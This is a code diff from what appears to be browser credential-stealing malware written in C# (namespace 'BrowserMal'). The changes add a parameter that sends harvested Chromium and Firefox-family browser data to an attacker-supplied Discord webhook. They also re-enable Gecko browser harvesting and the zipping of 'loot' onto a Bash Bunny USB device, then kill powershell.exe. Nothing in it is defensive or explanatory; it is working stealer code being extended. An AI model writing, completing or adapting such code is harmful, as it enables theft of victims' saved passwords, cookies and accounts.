@@ -12,7 +12,7 @@ namespace BrowserMal
         private static readonly GeckoBrowserManager geckoBrowserManager = new GeckoBrowserManager();
         private static readonly Dictionary<string, string> list = new Dictionary<string, string>();
 
-        public static void StartCreds(string output = "")
+        public static void StartCreds(string output = "", string discordWebhook = "")
         {
             browserManager.Init();
             List<BrowserModel> browsersChromium = browserManager.GetBrowsers();
@@ -21,29 +21,30 @@ namespace BrowserMal
             List<BrowserModel> browsersGecko = geckoBrowserManager.GetBrowsers();
 
             Chromium(ref browsersChromium);
-            //Gecko(ref browsersGecko);
+            Gecko(ref browsersGecko);
 
-            //Extration();
+            Extration();
 
-            if (string.IsNullOrEmpty(output))
+            if (!string.IsNullOrEmpty(discordWebhook))
             {
-                Discord.Webhook.BulkSend(list);
-                return;
+                Discord.Webhook.url = discordWebhook;
+                DiscordExtration();
             }
 
-            Filesaver.FileManager.SaveBytes(output, Zip.ZipArchives(list));
+            if (!string.IsNullOrEmpty(output))
+                Filesaver.FileManager.SaveBytes(output, Zip.ZipArchives(list));
+
             ProcessUtil.KillProcessDelayed(1, "powershell.exe");
         }
+
+        private static void DiscordExtration() => Discord.Webhook.BulkSend(list);
 
         private static void Extration()
         {
             string root = GetBashBunny();
 
             if (string.IsNullOrEmpty(root))
-            {
-                //Discord.Webhook.BulkSend(list);
                 return;
-            }
 
             Filesaver.FileManager.SaveBytes(root, "loot", Zip.ZipArchives(list));
         }
